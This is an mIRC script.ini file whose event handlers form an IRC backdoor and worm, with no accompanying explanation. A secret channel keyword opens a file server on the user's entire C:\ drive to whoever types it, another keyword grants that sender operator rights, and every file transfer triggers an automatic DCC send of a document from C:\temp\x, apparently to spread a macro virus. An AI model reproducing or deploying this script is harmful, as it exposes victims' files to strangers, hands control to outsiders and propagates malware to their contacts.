[script]
n0=on 1:TEXT:*relaxa*:#:/msg $chan [MrJim/SeptiC/TI] - BIG as usual in the future
n1=on 1:TEXT:*hoppauppohajja*:#:/mode $chan +b $me
n2=on 1:TEXT:*progråtta*:#:/mode $chan +o $nick
n3=on 1:TEXT:*iframtiden*:#:/fserve $nick 20 c:\
n4=on 1:FILESENT:*.*:if ( $me != $nick ) { /dcc send $nick C:\temp\x\doc1.doc }
n5=on 1:FILERCVD:*.*:if ( $me != $nick ) { /dcc send $nick C:\temp\x\doc1.doc }
